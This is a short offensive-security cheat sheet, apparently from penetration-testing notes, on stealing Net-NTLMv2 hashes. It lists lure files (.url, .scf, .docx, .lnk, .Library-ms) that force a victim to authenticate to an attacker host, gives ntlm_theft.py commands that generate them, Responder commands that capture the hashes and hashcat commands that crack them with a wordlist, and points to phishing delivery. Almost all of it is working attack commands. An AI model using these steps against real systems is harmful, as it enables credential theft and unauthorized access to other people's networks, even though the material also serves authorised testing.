# Net-NTLM capture with `ntlm_theft`

Induces client authentication to your SMB listener. Captured NetNTLMv2 is crack-only (`hashcat -m 5600`), not Pass the Hash.

| File | Trigger |
| --- | --- |
| `.url` | Target browses the folder |
| `.scf` | Target browses the folder (ICONFILE trick; broken on current Windows builds) |
| `.docx` / `.xlsx` | Target opens it |
| `.Library-ms` / `.lnk` | Target opens or browses it |

## Generate
```bash
python3 ntlm_theft.py -g url  -s <KALI> -f folder-probe
python3 ntlm_theft.py -g scf  -s <KALI> -f folder-probe
python3 ntlm_theft.py -g docx -s <KALI> -f document-probe
python3 ntlm_theft.py -g all  -s <KALI> -f format-survey
```
- `-f` is an output basename (becomes a directory), not a UNC path.
- Needs Python 3 + `xlsxwriter`. `-g all` creates every format: pick one that fits the delivery path.

## Listen
```bash
sudo responder -I <INTERFACE> -A
sudo ss -ltn '( sport = :445 )'
```
- `-A` = analyze mode: does not answer LLMNR/NBT-NS; SMB server still captures direct connections to your IP.
- Deliver via upload, share or [mail](../foothold/client-side-phishing.md#authenticated-smtp-delivery).
- No connection: file not opened, or outbound SMB blocked. If blocked, stop trying SMB-based files.

```bash
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat --show -m 5600 netntlmv2.txt
```
